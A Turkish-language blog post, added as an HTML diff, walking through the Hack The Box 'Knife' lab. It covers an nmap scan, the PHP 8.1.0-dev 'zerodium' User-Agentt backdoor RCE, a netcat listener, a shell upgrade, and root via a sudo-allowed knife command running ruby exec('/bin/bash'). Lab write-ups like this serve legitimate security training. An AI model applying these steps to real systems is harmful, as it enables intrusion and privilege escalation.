@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>HTB Knife Çözüm | order6tyfix</title>
+  <meta name="author" content="order6tyfix">
+  
+  <meta name="description" content="Recon
+
+
+Nmap taramasıyla açık portları ve çalışan uygulamaların versiyon bilgilerini alalım.-sC ekleyerek öntanımlı scriptlerle ekstra bilgi toplayabilirim.
+ $ nmap -sC -sV 10.10.10.242 
+
+
+
+
+Nmap Çıktısı
+1234567891011121314151617181920Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 13:16 +03Nmap scan report for 10.10.10.242Host is up (0.25s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title:  Emergent Medical Idea9000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.5)|_http-server-header: SimpleHTTP/0.6 Python/3.8.5|_http-title: Directory listing for /Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
+9000 portunda makinanın kök dizininden itibaren dosyalar listelenmiş. etc/passwd dosyasında james kullanıcısı dikkatimi çekti fakat daha fazla ilerletemedim. Siz belki buradan da bir şeyler yakalayabilirsiniz.
+Sitenin hangi dilde yazıldığını ve dilin hangi versiyonunu kullandığını tespit etmek için curl -I 10.10.10.242
+12345HTTP/1.1 200 OKDate: Mon, 09 Aug 2021 09:20:55 GMTServer: Apache/2.4.41 (Ubuntu)X-Powered-By: PHP/8.1.0-devContent-Type: text/html; charset=UTF-8
+PHP/8.1.0-dev ile yazıldığını öğrendim. Versiyon 8.1.0-dev için muhtemel exploitleri araştırmaya başladım ve RCE hakkında bir yazı buldum.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="HTB Knife Çözüm"/>
+  <meta property="og:site_name" content="order6tyfix"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">order6tyfix</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Arsiv
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Kategoriler
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Etiketler
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>Hakkımda
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> HTB Knife Çözüm</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><hr>
+</br>
+
+<p>Nmap taramasıyla açık portları ve çalışan uygulamaların versiyon bilgilerini alalım.<br>-sC ekleyerek öntanımlı scriptlerle ekstra bilgi toplayabilirim.</p>
+<pre><code> $ nmap -sC -sV 10.10.10.242 </code></pre>
+
+
+</br>
+
+<h1 id="Nmap-Ciktisi"><a href="#Nmap-Ciktisi" class="headerlink" title="Nmap Çıktısı"></a>Nmap Çıktısı</h1><hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 13:16 +03</span><br><span class="line">Nmap scan report for 10.10.10.242</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)</span><br><span class="line">|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)</span><br><span class="line">|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Emergent Medical Idea</span><br><span class="line">9000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.5)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/3.8.5</span><br><span class="line">|_http-title: Directory listing for /</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds</span><br></pre></td></tr></table></figure>
+<p>9000 portunda makinanın kök dizininden itibaren dosyalar listelenmiş. <mark>etc/passwd</mark> dosyasında james kullanıcısı dikkatimi çekti fakat daha fazla ilerletemedim. Siz belki buradan da bir şeyler yakalayabilirsiniz.</p>
+<p>Sitenin hangi dilde yazıldığını ve dilin hangi versiyonunu kullandığını tespit etmek için <mark>curl -I 10.10.10.242</mark></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 09 Aug 2021 09:20:55 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/8.1.0-dev</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+<p>PHP/8.1.0-dev ile yazıldığını öğrendim. Versiyon 8.1.0-dev için muhtemel exploitleri araştırmaya başladım ve <a target="_blank" rel="noopener" href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/">RCE hakkında bir yazı</a> buldum.</p>
+<span id="more"></span>
+
+</br>
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><hr>
+<p>Yazıda kısaca, php’nin github repository’sine 28 Mart 2021’de eklenen bir backdoor sayesinde oluşabilecek RCE anlatılıyor.</p>
+<p><img src="/img/phprce.png" alt="phprce"></p>
+<p>Gönderilen kod,<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"> HTTP header </a>‘larından User-Agent’ı User-Agentt şeklinde yazdıktan sonra User-Agentt değerine “zerodium” kelimesiyle başlayacak şekilde php’nin komut çalıştırmaya yarayan exec(), system() veya passthru() fonksiyonlarıyla devam eden string’den oluşacak bir RCE’yi tetikliyor.</p>
+<p><img src="/img/POC.png" alt="POC"></p>
+<p>Çalıştığını gördükten sonra reverse shell almak için küçük bir <a target="_blank" rel="noopener" href="https://gist.github.com/rshipp/eee36684db07d234c1cc">php/bash reverse shell kodu </a> buldum ve netcat’den shell alacağım portu dinlemeye aldım.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali /$ nc -lvnp 1234                                                                                            </span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234`</span><br></pre></td></tr></table></figure>
+
+<p>Ardından bulduğum kodu php fonksiyonunun içine koyarak isteği makinaya gönderdim ve james kullanıcısı olarak shell aldım. Siz tabii ki kendi tun0 inet adresinizi gireceksiniz.</p>
+<p><img src="/img/shell.png" alt="shell"></p>
+<p>Shell aldıktan sonra shell’in daha stabil çalışabilmesi için <mark> python3 -c ‘import pty;pty.spawn(“/bin/bash”);’</mark> ve <mark>export TERM=screen</mark>.</p>
+</br>
+
+<h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr>
+<p>sudo -l ile root yetkisi ile çalıştırabileceğim dosya/dizinleri listedim.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for james on knife:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure>
+
+<p>dosya başka bir dosyayı işaret ediyor ve işaret ettiği dosyaya baktığımda ruby ile alakalı dosyalar var.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/$ file usr/bin/knife</span><br><span class="line">file usr/bin/knife</span><br><span class="line">usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife</span><br><span class="line">james@knife:/$ file /opt/chef-workstation/bin/knife</span><br><span class="line">file /opt/chef-workstation/bin/knife</span><br><span class="line">/opt/chef-workstation/bin/knife: a /opt/chef-workstation/embedded/bin/ruby --disable-gems script, ASCII text executable</span><br></pre></td></tr></table></figure>
+
+
+<p>ruby’nin exec fonksyiyonu ile bash çağırabilirim </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">james@knife:/home$ cd james</span><br><span class="line">cd james</span><br><span class="line">james@knife:~$ echo &quot;exec(&#x27;/bin/bash&#x27;)&quot; &gt; esc.rb</span><br><span class="line">echo &quot;exec(&#x27;/bin/bash&#x27;)&quot; &gt; esc.rb</span><br><span class="line">james@knife:~$ ls</span><br><span class="line">ls</span><br><span class="line">esc.rb  linpeas-out.txt  linpeas.sh  user.txt</span><br><span class="line">james@knife:~$ chmod +x esc.rb</span><br><span class="line">chmod +x esc.rb</span><br><span class="line">james@knife:~$ sudo /opt/chef-workstation/bin/knife exec esc.rb</span><br><span class="line">sudo /opt/chef-workstation/bin/knife exec esc.rb</span><br><span class="line">root@knife:/home/james# </span><br></pre></td></tr></table></figure>
+
+
+<p>Mutlu son.</p>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2022/02/01/DNS-Nedir-Nasil-Calisir/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> önceki yazı</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Ana menü</a>
+    
+    <a type="button" class="btn btn-default disabled">sonraki yazı<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-01-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CTF-Cozum/">CTF Çözüm<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/RCE/">RCE<span>1</span></a></li> <li><a href="/tags/Ruby/">Ruby<span>1</span></a></li> <li><a href="/tags/Linux/">Linux<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+I'm gonna be on television.
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎YUKARI</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+
+</body>
+   </html>
